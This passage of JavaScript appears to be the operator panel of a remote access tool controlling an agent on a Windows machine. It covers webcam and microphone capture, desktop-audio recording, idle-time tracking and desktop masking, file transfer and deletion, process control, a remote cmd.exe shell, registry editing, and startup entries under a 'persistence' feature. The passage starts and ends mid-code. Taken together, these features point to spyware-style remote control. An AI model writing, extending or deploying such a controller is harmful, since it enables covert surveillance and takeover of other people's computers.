      S.webcam.busy = true;
      const t0 = performance.now();
      try {
        const r = await cmd("webcam_frame", { index: S.webcam.index, quality: S.webcam.quality }, 20);
        show(r.jpeg);
        S.webcam.last = r.jpeg;
        const info = $("#wInfo");
        if (info) info.textContent = r.width + "×" + r.height + " · " + Math.round(performance.now() - t0) + " ms";
      } catch (e) {
        S.webcam.active = false;
        const info = $("#wInfo");
        if (info) info.textContent = e.message;
      }
      S.webcam.busy = false;
    };
    const load = async () => {
      const host = $("#wDevices");
      host.innerHTML = '<div class="empty"><span class="spin"></span></div>';
      try {
        const r = await cmd("webcam_list", {}, 60);
        const cams = r.cameras || [];
        if (!cams.length) { host.innerHTML = '<div class="empty">No cameras detected.</div>'; return; }
        host.innerHTML = cams.map((c) =>
          '<div class="spread" style="padding:9px 14px;border-bottom:1px solid var(--line)">' +
          '<div><b style="font-size:12px">Camera ' + c.index + "</b>" +
          '<div class="small muted">' + c.width + "×" + c.height + "</div></div>" +
          '<button class="btn btn-sm" data-cam="' + c.index + '">Open</button></div>').join("");
        $$("[data-cam]", host).forEach((b) => b.onclick = () => {
          S.webcam.index = Number(b.dataset.cam);
          S.webcam.active = true;
          toast("Camera " + S.webcam.index + " opened", "ok");
          tick();
        });
      } catch (e) { host.innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#wList").onclick = (e) => run(e.currentTarget, load);
    $("#wSnap").onclick = () => {
      if (!S.webcam.last) return toast("No frame yet", "err");
      download(S.webcam.last, "webcam-" + Date.now() + ".jpg", "image/jpeg");
    };
    $("#wStop").onclick = (e) => run(e.currentTarget, async () => {
      S.webcam.active = false;
      try { await cmd("webcam_stop"); } catch (err) { /* ignore */ }
      frame.innerHTML = '<div class="media-empty">' + icon("camera") + "Stopped.</div>";
      toast("Webcam stopped", "ok");
    });
    const q = $("#wQ");
    if (q) q.oninput = () => { S.webcam.quality = Number(q.value); };
    load();
    every(tick, 900);
  },
};

/* =============================================================== microphone */
VIEWS.mic = {
  title: "Microphone",
  sub: "16 kHz mono WAV through the agent",
  render() {
    if (!S.connected) return offlineCard("The microphone module needs a live agent.");
    return pageHead("Microphone", "Record the default input device, then play or save it.",
      '<button class="btn btn-sm" id="mList">' + icon("refresh") + ' Devices</button>') +
      requireFeature("mic") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>Capture</h3><p>Default input device</p></div>' +
          '<div class="card-body form-stack">' +
            '<div class="form-row"><div class="field"><label>Seconds</label>' +
              '<input class="input" id="mSecs" type="number" min="1" max="30" value="5"></div>' +
              '<button class="btn btn-primary" id="mRec">' + icon("mic") + ' Record</button></div>' +
            '<div id="mResult" class="empty">No recording yet.</div>' +
          '</div></div>' +
        '<div class="card"><div class="card-head"><h3>Devices</h3></div>' +
          '<div class="card-body flush" id="mDevices"><div class="empty">Detect devices.</div></div>' +
        '</div>' +
      '</div>';
  },
  mount() {
    const load = async () => {
      const host = $("#mDevices");
      host.innerHTML = '<div class="empty"><span class="spin"></span></div>';
      try {
        const r = await cmd("mic_list", {}, 30);
        const mics = r.microphones || [];
        host.innerHTML = mics.length ? mics.map((m) =>
          '<div style="padding:9px 14px;border-bottom:1px solid var(--line)">' +
          '<b style="font-size:12px">' + esc(m.name) + "</b>" +
          (m.default ? ' <span class="badge ok">default</span>' : "") +
          '<div class="small muted mono">' + esc(m.id).slice(0, 80) + "</div></div>").join("") :
          '<div class="empty">No input devices.</div>';
      } catch (e) { host.innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#mList").onclick = (e) => run(e.currentTarget, load);
    $("#mRec").onclick = (e) => run(e.currentTarget, async () => {
      const secs = Math.max(1, Math.min(30, Number($("#mSecs").value) || 5));
      const r = await cmd("mic_capture", { seconds: secs }, secs + 20);
      const host = $("#mResult");
      host.className = "";
      host.innerHTML =
        '<audio controls style="width:100%" src="data:audio/wav;base64,' + r.wav + '"></audio>' +
        '<div class="hstack" style="margin-top:8px"><span class="small muted">' + r.seconds + "s · " + r.rate + " Hz · " +
        bytes(Math.round((r.wav.length * 3) / 4)) + "</span>" +
        '<button class="btn btn-sm" id="mSave">' + icon("download") + " Save WAV</button></div>";
      $("#mSave").onclick = () => download(r.wav, "mic-" + Date.now() + ".wav", "audio/wav");
      toast("Recording captured", "ok");
    });
    load();
  },
};

/* ============================================================ desktop audio */
VIEWS.audio = {
  title: "Desktop audio",
  sub: "Loopback capture, playback and system tones",
  render() {
    if (!S.connected) return offlineCard("The audio module needs a live agent.");
    return pageHead("Desktop audio", "Capture what the machine is playing, or push a WAV to it.") +
      requireFeature("audio") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>Loopback capture</h3><p>44.1 kHz stereo → mono WAV</p></div>' +
          '<div class="card-body form-stack">' +
            '<div class="form-row"><div class="field"><label>Seconds</label>' +
              '<input class="input" id="aSecs" type="number" min="1" max="30" value="5"></div>' +
              '<button class="btn btn-primary" id="aRec">' + icon("speaker") + ' Capture</button></div>' +
            '<div id="aResult" class="empty">No capture yet.</div>' +
          '</div></div>' +
        '<div class="card"><div class="card-head"><h3>Playback</h3><p>Send a WAV to the agent</p></div>' +
          '<div class="card-body form-stack">' +
            '<div class="field"><label>WAV file</label><input class="input" type="file" id="aFile" accept="audio/wav,audio/*"></div>' +
            '<div class="btn-row"><button class="btn btn-primary" id="aPlay">' + icon("play") + ' Play</button>' +
              '<button class="btn" id="aStop">' + icon("stop") + ' Stop</button>' +
              '<button class="btn" id="aBeep">' + icon("zap") + ' Beep</button></div>' +
            '<div class="note">' + icon("info") + '<div>Playback is asynchronous; <b>Stop</b> cancels the current sound.</div></div>' +
          '</div></div>' +
      '</div>';
  },
  mount() {
    $("#aRec").onclick = (e) => run(e.currentTarget, async () => {
      const secs = Math.max(1, Math.min(30, Number($("#aSecs").value) || 5));
      const r = await cmd("desktop_audio", { seconds: secs }, secs + 20);
      const host = $("#aResult");
      host.className = "";
      host.innerHTML =
        '<audio controls style="width:100%" src="data:audio/wav;base64,' + r.wav + '"></audio>' +
        '<div class="hstack" style="margin-top:8px"><span class="small muted">' + r.seconds + "s · " + r.rate + " Hz</span>" +
        '<button class="btn btn-sm" id="aSave">' + icon("download") + " Save WAV</button></div>";
      $("#aSave").onclick = () => download(r.wav, "desktop-" + Date.now() + ".wav", "audio/wav");
    });
    $("#aPlay").onclick = (e) => run(e.currentTarget, async () => {
      const f = $("#aFile").files[0];
      if (!f) throw new Error("choose a WAV file first");
      const b64 = await fileToB64(f);
      await cmd("play_audio", { wav: b64 }, 40);
      toast("Playing on the agent", "ok");
    });
    $("#aStop").onclick = (e) => run(e.currentTarget, async () => {
      await cmd("stop_audio"); toast("Playback stopped", "ok");
    });
    $("#aBeep").onclick = (e) => run(e.currentTarget, async () => {
      await cmd("audio", { op: "beep", freq: 880, ms: 250 }); toast("Beep sent", "ok");
    });
  },
};

function fileToB64(file) {
  return new Promise((resolve, reject) => {
    const fr = new FileReader();
    fr.onload = () => resolve(String(fr.result).split(",")[1] || "");
    fr.onerror = () => reject(new Error("cannot read file"));
    fr.readAsDataURL(file);
  });
}

/* ================================================================= windows */
VIEWS.windows = {
  title: "Windows",
  sub: "Visible top-level windows and idle time",
  render() {
    if (!S.connected) return offlineCard("The window module needs a live agent.");
    return pageHead("Windows", "Visible windows on the interactive desktop.", '<button class="btn btn-sm" id="winReload">' + icon("refresh") + " Refresh</button>") +
      requireFeature("windows") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 260px">' +
        '<div class="card"><div class="card-head"><h3>Visible windows</h3><div class="right"><span class="badge" id="winCount">0</span></div></div>' +
          '<div class="card-body flush" id="winList"><div class="empty">Loading…</div></div></div>' +
        '<div class="stack"><div class="card stat"><div class="stat-label">Idle</div><div class="stat-val" id="winIdle">—</div><div class="stat-sub">no keyboard or mouse input</div></div>' +
          '<div class="card pad"><div class="btn-row"><button class="btn btn-sm" id="winMask">' + icon("eye") + ' Mask desktop</button>' +
            '<button class="btn btn-sm" id="winLift">' + icon("eye") + ' Lift</button></div></div></div>' +
      '</div>';
  },
  mount() {
    const load = async () => {
      try {
        const r = await cmd("windows");
        const rows = r.windows || [];
        $("#winList").innerHTML = table(["Title", "PID"], rows, (w) =>
          '<tr><td class="trunc">' + esc(w.title) + '</td><td class="mono">' + w.pid + "</td></tr>", "No visible windows.");
        $("#winCount").textContent = rows.length;
        const i = await cmd("idle");
        $("#winIdle").textContent = dur(i.idle || 0);
      } catch (e) { $("#winList").innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#winReload").onclick = (e) => run(e.currentTarget, load);
    $("#winMask").onclick = (e) => run(e.currentTarget, async () => { await cmd("mask"); toast("Masked", "ok"); });
    $("#winLift").onclick = (e) => run(e.currentTarget, async () => { await cmd("lift"); toast("Lifted", "ok"); });
    load();
  },
};

/* =================================================================== files */
VIEWS.files = {
  title: "Files",
  sub: "Browse, transfer and inspect files on the agent host",
  render() {
    if (!S.connected) return offlineCard("The file manager needs a live agent.");
    return pageHead("File manager", "Streamed downloads, chunked uploads, hashes and search.",
      '<button class="btn btn-sm" id="fMkdir">' + icon("plus") + ' New folder</button>' +
      '<button class="btn btn-sm" id="fUpload">' + icon("upload") + ' Upload</button>' +
      '<button class="btn btn-sm" id="fSearch">' + icon("search") + ' Find</button>' +
      '<button class="btn btn-sm" id="fRefresh">' + icon("refresh") + ' Refresh</button>') +
      requireFeature("files") +
      '<input type="file" id="fFile" style="display:none">' +
      '<div class="card">' +
        '<div class="card-head" style="gap:8px;flex-wrap:wrap">' +
          '<button class="btn btn-sm btn-icon" id="fUp" title="Up">' + icon("chevron") + '</button>' +
          '<input class="input mono" id="fPath" style="flex:1;min-width:220px" placeholder="C:\\">' +
          '<button class="btn btn-sm" id="fGo">Go</button>' +
          '<span class="badge" id="fCount">0</span>' +
        '</div>' +
        '<div class="card-body tight"><div class="hstack" id="fDrives"></div></div>' +
        '<div class="card-body flush" id="fList"><div class="empty">Loading…</div></div>' +
      '</div>';
  },
  mount(v) {
    const paint = () => {
      const f = S.files;
      const input = $("#fPath", v);
      if (input && input.value !== f.path) input.value = f.path;
      const host = $("#fList", v);
      const rows = f.entries.filter((e) => !f.filter || e.name.toLowerCase().includes(f.filter.toLowerCase()));
      host.innerHTML = table(["", "Name", "Size", "Modified", ""], rows, (e) => {
        const full = joinPath(f.path, e.name);
        return "<tr><td>" + icon(e.dir ? "folder" : "hash") + "</td>" +
          '<td><button class="btn btn-ghost" style="border:0;background:none;padding:0;height:auto;color:var(--text)" data-nav="' + esc(full) + '" data-dir="' + (e.dir ? 1 : 0) + '">' + esc(e.name) + "</button>" +
          (e.attrs ? ' <span class="badge">' + esc(e.attrs) + "</span>" : "") + "</td>" +
          '<td class="num">' + (e.dir ? "—" : bytes(e.size)) + "</td>" +
          '<td class="small muted nowrap">' + when(e.mtime) + "</td>" +
          '<td class="nowrap">' +
            (e.dir ? "" : '<button class="btn btn-sm" data-dl="' + esc(full) + '">Get</button> ') +
            '<button class="btn btn-sm" data-ren="' + esc(full) + '">Rename</button> ' +
            (e.dir ? "" : '<button class="btn btn-sm" data-hash="' + esc(full) + '">Hash</button> ') +
            '<button class="btn btn-sm btn-danger" data-del="' + esc(full) + '" data-isdir="' + (e.dir ? 1 : 0) + '">Del</button>' +
          "</td></tr>";
      }, "This folder is empty.");
      const c = $("#fCount", v); if (c) c.textContent = rows.length + " items";
      $$("[data-nav]", host).forEach((b) => b.onclick = () => {
        if (b.dataset.dir === "1") load(b.dataset.nav);
        else selectFile(b.dataset.nav);
      });
      $$("[data-dl]", host).forEach((b) => b.onclick = () => {
        location.href = "/api/download?path=" + encodeURIComponent(b.dataset.dl) + "&client=" + encodeURIComponent(S.client) + "&token=" + encodeURIComponent(S.token);
      });
      $$("[data-hash]", host).forEach((b) => b.onclick = (e) => run(e.currentTarget, async () => {
        const r = await cmd("file_hash", { path: b.dataset.hash }, 60);
        modal("File hash", kv([["Path", r.path], ["Size", bytes(r.size)], ["SHA-256", r.sha256, true], ["SHA-1", r.sha1], ["MD5", r.md5]]));
      }));
      $$("[data-ren]", host).forEach((b) => b.onclick = () => {
        const full = b.dataset.ren;
        const name = full.split(/[\\/]/).pop();
        const m = modal("Rename", '<div class="field"><label>New name</label><input class="input" id="renBox" value="' + esc(name) + '"></div>',
          '<button class="btn btn-primary" data-ok>Rename</button>');
        const input = $("#renBox", m.el);
        input.focus(); input.select();
        const submit = async () => {
          const to = joinPath(S.files.path, input.value.trim());
          if (!input.value.trim()) return;
          try { await cmd("rename", { path: full, to }); m.close(); toast("Renamed", "ok"); load(S.files.path); }
          catch (e) { fail(e); }
        };
        $("[data-ok]", m.el).onclick = submit;
        input.addEventListener("keydown", (e) => { if (e.key === "Enter") submit(); });
      });
      $$("[data-del]", host).forEach((b) => b.onclick = async () => {
        const ok = await confirmBox("Delete", "Permanently delete " + b.dataset.del + "?\n\nThis bypasses the recycle bin.", true);
        if (!ok) return;
        try {
          await cmd("delete", { path: b.dataset.del, recursive: b.dataset.isdir === "1" });
          toast("Deleted", "ok"); load(S.files.path);
        } catch (e) { fail(e); }
      });
    };
    const load = async (path) => {
      try {
        const r = await cmd("listdir", { path: path || S.files.path || "C:\\" });
        S.files.path = r.path; S.files.parent = r.parent; S.files.entries = r.entries || [];
        paint();
        const host = $("#fDrives", v);
        if (host && !host.dataset.done) {
          const d = await cmd("drives");
          S.files.drives = d.drives || [];
          host.dataset.done = "1";
          host.innerHTML = '<span class="small muted">Drives</span>' + S.files.drives.map((x) =>
            '<button class="btn btn-sm" data-drive="' + esc(x.path) + '">' + esc(x.path) + ' <span class="muted">' + esc(x.type) + "</span></button>").join("");
          $$("[data-drive]", host).forEach((b) => b.onclick = () => load(b.dataset.drive));
        }
      } catch (e) {
        $("#fList", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>";
        $("#fPath", v).value = S.files.path;
      }
    };
    const selectFile = (path) => {
      cmd("stat", { path }).then((r) => {
        modal("File details", kv([["Name", r.name], ["Path", r.path], ["Size", bytes(r.size)], ["Modified", when(r.mtime)], ["Type", r.dir ? "directory" : "file"]]),
          '<button class="btn" data-close>Close</button>');
      }).catch(fail);
    };
    $("#fGo", v).onclick = () => load($("#fPath", v).value.trim());
    $("#fPath", v).addEventListener("keydown", (e) => { if (e.key === "Enter") load(e.target.value.trim()); });
    $("#fUp", v).onclick = () => { if (S.files.parent) load(S.files.parent); };
    $("#fRefresh", v).onclick = (e) => run(e.currentTarget, () => load(S.files.path));
    $("#fMkdir", v).onclick = () => {
      const m = modal("New folder", '<div class="field"><label>Name</label><input class="input" id="mkBox" placeholder="new folder"></div>',
        '<button class="btn btn-primary" data-ok>Create</button>');
      const box = $("#mkBox", m.el); box.focus();
      $("[data-ok]", m.el).onclick = async () => {
        if (!box.value.trim()) return;
        try { await cmd("mkdir", { path: joinPath(S.files.path, box.value.trim()) }); m.close(); toast("Folder created", "ok"); load(S.files.path); }
        catch (e) { fail(e); }
      };
      box.addEventListener("keydown", (e) => { if (e.key === "Enter") $("[data-ok]", m.el).click(); });
    };
    $("#fUpload", v).onclick = () => $("#fFile", v).click();
    $("#fFile", v).onchange = (e) => {
      const f = e.target.files[0];
      if (!f) return;
      const target = joinPath(S.files.path, f.name);
      const m = modal("Uploading", '<div class="small muted">' + esc(f.name) + " → " + esc(target) + '</div><div class="meter" style="margin-top:12px"><i id="upBar" style="width:0%"></i></div>');
      const xhr = new XMLHttpRequest();
      xhr.open("POST", "/api/upload?path=" + encodeURIComponent(target) + "&client=" + encodeURIComponent(S.client) + "&token=" + encodeURIComponent(S.token));
      xhr.upload.onprogress = (ev) => { if (ev.lengthComputable) $("#upBar", m.el).style.width = (ev.loaded / ev.total * 100).toFixed(1) + "%"; };
      xhr.onload = () => {
        m.close();
        if (xhr.status === 200) { toast("Uploaded " + f.name, "ok"); load(S.files.path); }
        else { toast("Upload failed: " + xhr.responseText.slice(0, 160), "err"); }
      };
      xhr.onerror = () => { m.close(); toast("Upload failed", "err"); };
      xhr.send(f);
      e.target.value = "";
    };
    $("#fSearch", v).onclick = () => {
      const m = modal("Find files",
        '<div class="form-stack"><div class="field"><label>Root</label><input class="input mono" id="sRoot" value="' + esc(S.files.path) + '"></div>' +
        '<div class="field"><label>Pattern</label><input class="input mono" id="sPat" value="*.*"></div>' +
        '<div id="sOut" class="small muted">Glob pattern, recursive.</div></div>',
        '<button class="btn btn-primary" data-ok>' + icon("search") + ' Search</button>');
      $("[data-ok]", m.el).onclick = async (ev) => {
        busy(ev.currentTarget, true);
        try {
          const r = await cmd("file_search", { root: $("#sRoot", m.el).value.trim(), pattern: $("#sPat", m.el).value.trim() || "*", limit: 400 }, 90);
          $("#sOut", m.el).innerHTML = table(["Path", "Size"], r.results, (x) =>
            '<tr><td class="mono trunc">' + esc(x.path) + '</td><td class="num">' + (x.dir ? "dir" : bytes(x.size)) + "</td></tr>", "No matches.");
        } catch (e) { $("#sOut", m.el).textContent = e.message; }
        busy(ev.currentTarget, false);
      };
    };
    load(S.files.path || "C:\\");
  },
};

function joinPath(dir, name) {
  if (!dir) return name;
  const sep = dir.indexOf("/") !== -1 && dir.indexOf("\\") === -1 ? "/" : "\\";
  return dir.replace(/[\\/]+$/, "") + sep + name;
}

/* ============================================================== processes */
VIEWS.processes = {
  title: "Processes",
  sub: "Enumerate, start and terminate processes",
  render() {
    if (!S.connected) return offlineCard("The process module needs a live agent.");
    return pageHead("Processes", "Running processes with owner and working set.",
      '<button class="btn btn-sm" id="pStart">' + icon("play") + ' Start process</button>' +
      '<button class="btn btn-sm" id="pRefresh">' + icon("refresh") + ' Refresh</button>') +
      requireFeature("processes") +
      '<div class="card"><div class="card-head"><input class="input" id="pFilter" placeholder="Filter by name, user or path" style="max-width:360px">' +
        '<div class="right"><span class="badge" id="pCount">0</span></div></div>' +
        '<div class="card-body flush" id="pList"><div class="empty">Loading…</div></div></div>';
  },
  mount(v) {
    const paint = () => {
      const rows = S.proc.rows.filter((p) => {
        const q = S.proc.filter.toLowerCase();
        return !q || (p.name || "").toLowerCase().includes(q) || (p.user || "").toLowerCase().includes(q) || (p.exe || "").toLowerCase().includes(q);
      });
      $("#pList", v).innerHTML = table(["PID", "Process", "User", "Memory", ""], rows, (p) =>
        '<tr><td class="mono">' + p.pid + "</td><td>" + esc(p.name) + '</td><td class="small muted trunc">' + esc(p.user) +
        '</td><td class="num">' + bytes(p.rss) + '</td><td><button class="btn btn-sm btn-danger" data-kill="' + p.pid + '">Kill</button></td></tr>',
        "No processes.");
      $("#pCount", v).textContent = rows.length + " / " + S.proc.rows.length;
      $$("[data-kill]", v).forEach((b) => b.onclick = async () => {
        const ok = await confirmBox("Terminate", "Terminate PID " + b.dataset.kill + "?", true);
        if (!ok) return;
        try { await cmd("process_kill", { pid: Number(b.dataset.kill) }); toast("Terminated", "ok"); load(); }
        catch (e) { fail(e); }
      });
    };
    const load = async () => {
      try {
        const r = await cmd("processes", {}, 40);
        S.proc.rows = r.processes || [];
        paint();
      } catch (e) { $("#pList", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#pFilter", v).oninput = (e) => { S.proc.filter = e.target.value; paint(); };
    $("#pRefresh", v).onclick = (e) => run(e.currentTarget, load);
    $("#pStart", v).onclick = () => {
      const m = modal("Start process",
        '<div class="form-stack"><div class="field"><label>Executable</label><input class="input mono" id="psPath" placeholder="C:\\Windows\\notepad.exe"></div>' +
        '<div class="field"><label>Working directory (optional)</label><input class="input mono" id="psCwd" placeholder="leave blank for the exe folder"></div></div>',
        '<button class="btn btn-primary" data-ok>Start</button>');
      $("[data-ok]", m.el).onclick = async (ev) => {
        const path = $("#psPath", m.el).value.trim();
        const cwd = $("#psCwd", m.el).value.trim();
        if (!path) return;
        busy(ev.currentTarget, true);
        try {
          const r = await cmd("process_start", { path, cwd });
          m.close(); toast("Started PID " + r.pid, "ok"); later(load, 700);
        } catch (e) { fail(e); }
        busy(ev.currentTarget, false);
      };
    };
    load();
    every(() => { if (S.route === "processes") load(); }, 12000);
  },
};

/* =================================================================== shell */
VIEWS.shell = {
  title: "Shell",
  sub: "cmd.exe, detached launch and Python execution",
  render() {
    if (!S.connected) return offlineCard("The shell needs a live agent.");
    return pageHead("Shell", "Commands run on the agent host with a 120 second ceiling.",
      '<button class="btn btn-sm" id="shClear">' + icon("trash") + ' Clear</button>') +
      requireFeature("shell") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 300px">' +
        '<div class="card"><div class="card-head"><h3>Terminal</h3><p>subprocess · shell=True</p></div>' +
          '<div class="card-body"><div class="term" id="shTerm"></div>' +
            '<div class="hstack" style="margin-top:10px"><span class="mono muted">$</span>' +
              '<input class="input mono" id="shCmd" placeholder="whoami /all" style="flex:1">' +
              '<button class="btn btn-primary" id="shRun">Run</button></div></div></div>' +
        '<div class="stack"><div class="card pad form-stack">' +
          '<div class="field"><label>Launch with ShellExecute</label><input class="input mono" id="shPath" placeholder="notepad.exe"></div>' +
          '<div class="field"><label>Arguments</label><input class="input mono" id="shArgs" placeholder="C:\\file.txt"></div>' +
          '<button class="btn btn-sm" id="shExec">' + icon("play") + ' Launch</button>' +
          '<div class="divider"></div>' +
          '<div class="field"><label>Detached command</label><input class="input mono" id="shDetached" placeholder="cmd /c start ..."></div>' +
          '<button class="btn btn-sm" id="shRunCmd">Run detached</button>' +
          '<div class="divider"></div>' +
          '<div class="field"><label>Open URL on the agent</label><input class="input mono" id="shUrl" placeholder="https://example.com"></div>' +
          '<button class="btn btn-sm" id="shVisit">Open URL</button>' +
        '</div></div>' +
      '</div>';
  },
  mount(v) {
    const term = $("#shTerm", v);
    const paint = () => {
      term.innerHTML = S.shell.lines.map((l) =>
        '<div><span class="' + l.kind + '">' + (l.kind === "cmd" ? "$ " : "") + esc(l.text) + "</span></div>").join("") ||
        '<span class="meta">Type a command and press Enter.</span>';
      term.scrollTop = term.scrollHeight;
    };
    const put = (kind, text) => { S.shell.lines.push({ kind, text }); if (S.shell.lines.length > 400) S.shell.lines.shift(); paint(); };
    const runIt = async (command, button) => {
      if (!command.trim()) return;
      S.shell.hist.push(command);
      S.shell.hpos = S.shell.hist.length;
      put("cmd", command);
      if (button) busy(button, true);
      try {
        const r = await cmd("shell", { command, timeout: 60 }, 90);
        if (r.stdout) put("out", r.stdout.replace(/\s+$/, ""));
        if (r.stderr) put("err", r.stderr.replace(/\s+$/, ""));
        put("meta", "[exit " + r.code + "]");
      } catch (e) { put("err", e.message); }
      if (button) busy(button, false);
    };
    paint();
    const input = $("#shCmd", v);
    input.focus();
    $("#shRun", v).onclick = (e) => { const c = input.value; input.value = ""; runIt(c, e.currentTarget); };
    input.addEventListener("keydown", (e) => {
      if (e.key === "Enter") { const c = input.value; input.value = ""; runIt(c, $("#shRun", v)); }
      else if (e.key === "ArrowUp") {
        if (!S.shell.hist.length) return;
        S.shell.hpos = Math.max(0, S.shell.hpos - 1);
        input.value = S.shell.hist[S.shell.hpos] || "";
        e.preventDefault();
      } else if (e.key === "ArrowDown") {
        S.shell.hpos = Math.min(S.shell.hist.length, S.shell.hpos + 1);
        input.value = S.shell.hist[S.shell.hpos] || "";
        e.preventDefault();
      }
    });
    $("#shClear", v).onclick = () => { S.shell.lines = []; paint(); };
    $("#shExec", v).onclick = (e) => run(e.currentTarget, async () => {
      const path = $("#shPath", v).value.trim();
      if (!path) throw new Error("path required");
      const r = await cmd("execute", { path, args: $("#shArgs", v).value, verb: "open" });
      toast("Launched " + r.launched, "ok");
    });
    $("#shRunCmd", v).onclick = (e) => run(e.currentTarget, async () => {
      const command = $("#shDetached", v).value.trim();
      if (!command) throw new Error("command required");
      const r = await cmd("run_command", { command });
      toast("Detached PID " + r.pid, "ok");
    });
    $("#shVisit", v).onclick = (e) => run(e.currentTarget, async () => {
      const url = $("#shUrl", v).value.trim();
      if (!url) throw new Error("url required");
      await cmd("visit_website", { url });
      toast("Opened on the agent", "ok");
    });
  },
};

/* ================================================================ registry */
VIEWS.registry = {
  title: "Registry",
  sub: "Browse and edit keys on the agent host",
  render() {
    if (!S.connected) return offlineCard("The registry editor needs a live agent.");
    return pageHead("Registry", "HKCU, HKLM, HKCR and HKU.",
      '<button class="btn btn-sm" id="rNew">' + icon("plus") + ' New key</button>' +
      '<button class="btn btn-sm" id="rRefresh">' + icon("refresh") + ' Refresh</button>') +
      requireFeature("registry") +
      '<div class="card"><div class="card-head" style="flex-wrap:wrap;gap:8px">' +
        '<select class="select" id="rRoot" style="width:110px">' +
          ["HKCU", "HKLM", "HKCR", "HKU"].map((r) => '<option' + (S.reg.root === r ? " selected" : "") + ">" + r + "</option>").join("") +
        '</select><input class="input mono" id="rPath" style="flex:1;min-width:220px" placeholder="Software\\Microsoft\\Windows\\CurrentVersion\\Run">' +
        '<button class="btn btn-sm" id="rGo">Go</button></div>' +
        '<div class="card-body flush" id="rList"><div class="empty">Loading…</div></div></div>';
  },
  mount(v) {
    const paint = () => {
      const host = $("#rList", v);
      const keys = S.reg.keys, vals = S.reg.values;
      host.innerHTML =
        (keys.length ? '<div class="card-head"><h3>Subkeys</h3><div class="right"><span class="badge">' + keys.length + '</span></div></div><div class="card-body tight"><div class="hstack">' +
          keys.map((k) => '<button class="btn btn-sm" data-key="' + esc(k) + '">' + icon("folder") + esc(k) + "</button>").join("") + "</div></div>" : "") +
        '<div class="card-head"><h3>Values</h3><div class="right"><button class="btn btn-sm" id="rAdd">' + icon("plus") + ' New value</button></div></div>' +
        table(["Name", "Type", "Data", ""], vals, (x) =>
          '<tr><td class="mono">' + esc(x.name) + '</td><td class="small muted">' + esc(x.type) +
          '</td><td class="mono trunc">' + esc(x.data) + '</td><td><button class="btn btn-sm btn-danger" data-delval="' + esc(x.name) + '">Del</button></td></tr>',
          "No values here.");
      $$("[data-key]", host).forEach((b) => b.onclick = () => {
        S.reg.path = (S.reg.path ? S.reg.path + "\\" : "") + b.dataset.key;
        $("#rPath", v).value = S.reg.path;
        load();
      });
      $$("[data-delval]", host).forEach((b) => b.onclick = async () => {
        const ok = await confirmBox("Delete value", "Delete " + b.dataset.delval + "?", true);
        if (!ok) return;
        try { await cmd("registry", { op: "delete_value", root: S.reg.root, path: S.reg.path, name: b.dataset.delval }); toast("Deleted", "ok"); load(); }
        catch (e) { fail(e); }
      });
      const add = $("#rAdd", host);
      if (add) add.onclick = () => {
        const m = modal("New value",
          '<div class="form-stack"><div class="field"><label>Name</label><input class="input" id="rvName"></div>' +
          '<div class="field"><label>Type</label><select class="select" id="rvType"><option value="1">REG_SZ</option><option value="4">REG_DWORD</option></select></div>' +
          '<div class="field"><label>Data</label><input class="input" id="rvData"></div></div>',
          '<button class="btn btn-primary" data-ok>Set</button>');
        $("[data-ok]", m.el).onclick = async (ev) => {
          busy(ev.currentTarget, true);
          try {
            const type = Number($("#rvType", m.el).value);
            const raw = $("#rvData", m.el).value;
            await cmd("registry", {
              op: "set", root: S.reg.root, path: S.reg.path,
              name: $("#rvName", m.el).value.trim(),
              type, data: type === 4 ? Number(raw) || 0 : raw,
            });
            m.close(); toast("Value written", "ok"); load();
          } catch (e) { fail(e); }
          busy(ev.currentTarget, false);
        };
      };
    };
    const load = async () => {
      try {
        const r = await cmd("registry", { op: "list", root: S.reg.root, path: S.reg.path });
        S.reg.keys = r.keys || []; S.reg.values = r.values || [];
        paint();
      } catch (e) {
        S.reg.keys = []; S.reg.values = [];
        $("#rList", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>";
      }
    };
    $("#rGo", v).onclick = () => { S.reg.path = $("#rPath", v).value.trim(); load(); };
    $("#rPath", v).addEventListener("keydown", (e) => { if (e.key === "Enter") { S.reg.path = e.target.value.trim(); load(); } });
    $("#rRoot", v).onchange = (e) => { S.reg.root = e.target.value; load(); };
    $("#rRefresh", v).onclick = (e) => run(e.currentTarget, load);
    $("#rNew", v).onclick = () => {
      const m = modal("Create key", '<div class="field"><label>Subkey</label><input class="input mono" id="rkName" placeholder="MyKey"></div>',
        '<button class="btn btn-primary" data-ok>Create</button>');
      $("[data-ok]", m.el).onclick = async () => {
        const sub = $("#rkName", m.el).value.trim();
        if (!sub) return;
        try {
          await cmd("registry", { op: "create_key", root: S.reg.root, path: (S.reg.path ? S.reg.path + "\\" : "") + sub });
          m.close(); toast("Key created", "ok"); load();
        } catch (e) { fail(e); }
      };
    };
    $("#rPath", v).value = S.reg.path;
    load();
  },
};

/* ================================================================= startup */
VIEWS.startup = {
  title: "Startup",
  sub: "Run keys and the per-user startup folder",
  render() {
    if (!S.connected) return offlineCard("Startup inventory needs a live agent.");
    return pageHead("Startup", "What launches on logon.",
      '<button class="btn btn-sm" id="sAdd">' + icon("plus") + ' Add entry</button>' +
      '<button class="btn btn-sm" id="sRefresh">' + icon("refresh") + ' Refresh</button>') +
      requireFeature("persistence") +
      '<div class="card"><div class="card-head"><h3>Autostart entries</h3><div class="right"><span class="badge" id="sCount">0</span></div></div>' +
        '<div class="card-body flush" id="sList"><div class="empty">Loading…</div></div></div>';
  },
  mount(v) {
    const load = async () => {
      try {
        const r = await cmd("startup_list");
        const rows = r.items || [];
        $("#sList", v).innerHTML = table(["Hive", "Name", "Command", ""], rows, (x) =>
          '<tr><td><span class="badge">' + esc(x.hive) + "</span></td><td>" + esc(x.name) +
          '</td><td class="mono trunc">' + esc(x.command) + '</td><td><button class="btn btn-sm btn-danger" data-rm="' + esc(x.name) + '">Remove</button></td></tr>',
          "No autostart entries.");
        $("#sCount", v).textContent = rows.length;
        $$("[data-rm]", v).forEach((b) => b.onclick = async () => {
          const ok = await confirmBox("Remove entry", "Remove " + b.dataset.rm + " from startup?", true);
          if (!ok) return;
